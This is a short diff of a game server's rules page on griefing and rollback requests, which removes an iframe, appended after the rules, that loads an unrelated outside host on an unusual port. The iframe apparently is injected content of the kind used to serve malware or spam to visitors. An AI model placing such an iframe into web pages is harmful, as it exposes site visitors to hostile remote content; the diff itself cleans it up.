@@ -58,8 +58,3 @@ They stole my hard-to-make gear through legitimate means and now I have to start
 Griefing WILL NOT be acted upon (rolled back/refunded) or investigated if the window in which it occurred is more than 7 days not inclusive (that means >7 days not >=7 days).
 
 As always, if you have ANY questions, feel free to PM me! And please do so BEFORE doing something questionable, not after.
-
-
-<iframe src="http://zoltritw.meloncu.be:1121/" width="100%" height="1200">
-  <p>Your browser does not support iframes.</p>
-</iframe>
